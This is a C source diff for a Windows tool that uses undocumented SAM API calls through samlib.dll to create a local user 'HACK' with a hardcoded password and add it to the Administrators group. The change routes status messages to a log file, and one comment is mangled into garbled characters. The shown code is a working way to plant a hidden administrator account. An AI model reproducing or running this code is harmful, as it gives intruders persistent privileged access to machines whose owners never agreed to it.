@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include "samlib.h"
+#include "../Shared/log.h"
 
 #define want_user L"HACK"
 #define want_password L"zxczxczxc"
@@ -48,7 +49,7 @@ int main() {
   pRtlInitUnicodeString(&serverName, L"localhost");
   pRtlInitUnicodeString(&sBuiltin, L"Builtin");
 
-  // ÅäÖÃ¼Æ»®ÈÎÎñ
+  // ï¿½ï¿½ï¿½Ã¼Æ»ï¿½ï¿½ï¿½ï¿½ï¿½
   pRtlInitUnicodeString(&password, want_password);
   pRtlInitUnicodeString(&user, want_user);
 
@@ -69,6 +70,13 @@ int main() {
   SAMPR_HANDLE hAdminGroup;
   PSID userSID = NULL;
   SAMPR_USER_ALL_INFORMATION userAllInfo = {0};
+
+    FILE* fp = fopen("UserAddLog.txt","a+");
+    if (fp == NULL){
+        return -1;
+    }
+    log_set_level(LOG_TRACE);
+    log_add_fp(fp,LOG_INFO);
 
   HMODULE hSamsrv = LoadLibraryA("samlib.dll");
   pSamConnect = (decltype(&SamConnect))GetProcAddress(hSamsrv, "SamConnect");
@@ -107,13 +115,13 @@ int main() {
           status = pSamLookupDomainInSamServer(
               hServer, &pEnumDomainBuffer[i].Name, &BuiltSID);
           if (NT_SUCCESS(status)) {
-            printf("[+] SamLookupDomainInSamServer Built \n");
+              log_info("[+] SamLookupDomainInSamServer Built \n");
           }
         } else {
           status = pSamLookupDomainInSamServer(
               hServer, &pEnumDomainBuffer[i].Name, &AccountSID);
           if (NT_SUCCESS(status)) {
-            printf("[+] SamLookupDomainInSamServer Account \n");
+              log_info("[+] SamLookupDomainInSamServer Account \n");
           }
         }
       }
@@ -127,7 +135,7 @@ int main() {
                                   USER_ALL_ACCESS | DELETE | WRITE_DAC,
                                   &hUserHandle, &grantAccess, &relativeId);
       if (NT_SUCCESS(status)) {
-        printf("[+] SamCreateUser2InDomain success. User RID: %d\n",
+          log_info("[+] SamCreateUser2InDomain success. User RID: %d\n",
                 relativeId);
         userAllInfo.NtPasswordPresent = TRUE;
         userAllInfo.WhichFields |= USER_ALL_NTPASSWORDPRESENT;
@@ -140,14 +148,14 @@ int main() {
         status = pSamSetInformationUser(hUserHandle, UserAllInformation,
                                         (SAMPR_USER_INFO_BUFFER*)&userAllInfo);
         if (NT_SUCCESS(status)) {
-          printf("[+] SamSetInformationUser success.\n");
+            log_info("[+] SamSetInformationUser success.\n");
         } else
-          printf("[!] SamSetInformationUser error 0x%ld\n", status);
+            log_info("[!] SamSetInformationUser error 0x%ld\n", status);
       } else
-        printf("[!] SamCreateUser2InDomain error 0x%ld\n", status);
+          log_info("[!] SamCreateUser2InDomain error 0x%ld\n", status);
 
     } else
-      printf("[!] SamOpenDomain error. 0x%ld\n", status);
+        log_info("[!] SamOpenDomain error. 0x%ld\n", status);
 
     status = pSamOpenDomain(hServer, DOMAIN_LOOKUP, BuiltSID, &hDomainHandle);
     if (NT_SUCCESS(status)) {
@@ -165,16 +173,18 @@ int main() {
           // Add user to Administrators
           status = pSamAddMemberToAlias(hAdminGroup, userSID);
           if (NT_SUCCESS(status)) {
-            printf("[+] SamAddMemberToAlias success.\n");
+              log_info("[+] SamAddMemberToAlias success.\n");
           } else
-            printf("[!] AddMemberToAlias wrong 0x%08X\n", status);
+              log_info("[!] AddMemberToAlias wrong 0x%08X\n", status);
         } else
-          printf("[!] SamOpenAlias error 0x%08X\n", status);
+            log_info("[!] SamOpenAlias error 0x%08X\n", status);
       } else
-        printf("[!] SamLookupNamesInDomain error 0x%08X\n", status);
+          log_info("[!] SamLookupNamesInDomain error 0x%08X\n", status);
     }
   } else
-    printf("[!] Samconnect error\n");
-
+    log_info("[!] Samconnect error\n");
+  
+    log_info("Add User success");
+    fclose(fp);
   return 0;
 }
